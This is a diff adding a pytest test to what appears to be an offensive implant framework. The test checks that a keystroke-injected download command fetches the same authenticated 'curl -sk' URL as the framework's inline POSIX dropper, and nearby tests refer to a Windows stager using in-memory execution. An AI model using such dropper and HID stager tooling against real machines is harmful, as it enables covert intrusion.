@@ -23,6 +23,7 @@ So `download` is the default HERE and nowhere else: the board types a
 import asyncio
 import base64
 import os
+import re
 import shlex
 import types
 from unittest import mock
@@ -169,6 +170,21 @@ class TestTheFetchedArtefactIsTheInlineOne:
         script = windows_stager_script(HOST, PORT, True)
         assert "schtasks" not in script
         assert "GetDelegateForFunctionPointer" in script
+
+    @pytest.mark.parametrize("platform", POSIX)
+    def test_posix_fetches_the_very_same_url_as_the_inline_dropper(
+            self, platform):
+        # the inline POSIX dropper curls the platform route; the short command
+        # has to fetch the LITERAL same URL, which is what makes the bytes
+        # identical instead of merely equivalent
+        inline = generate_dropper(platform, HOST, PORT, use_ssl=True,
+                                  resilient=False)
+        match = re.search(r"curl -sk '([^']+)'", inline)
+        assert match, inline
+        inline_url = match.group(1)
+        token = inline_url.split("auth=", 1)[1]
+        cmd = ss.hid_download_command(platform, HOST, PORT, token=token)
+        assert inline_url in cmd
 
     def test_the_typed_command_points_at_the_route_that_serves_it(self):
         cmd = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
